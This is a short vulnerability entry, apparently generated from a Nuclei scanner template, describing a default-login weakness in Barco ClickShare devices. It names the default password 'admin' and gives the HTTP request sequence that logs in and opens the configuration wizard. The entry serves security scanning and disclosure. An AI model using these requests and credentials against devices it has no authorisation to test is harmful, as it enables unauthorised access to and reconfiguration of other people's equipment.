# Vulnerability: Barco ClickShare - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`barco-clickshare-default-login.yaml`)

## Description
Barco ClickShare contains a default login vulnerability. Default login password 'admin' was found.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}

POST /login/log_me_in HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

csrf_protection_token={{token}}&username={{username}}&password={{password}}&eula_accepted=true

GET /configuration_wizard HTTP/1.1
Host: {{Hostname}}
```

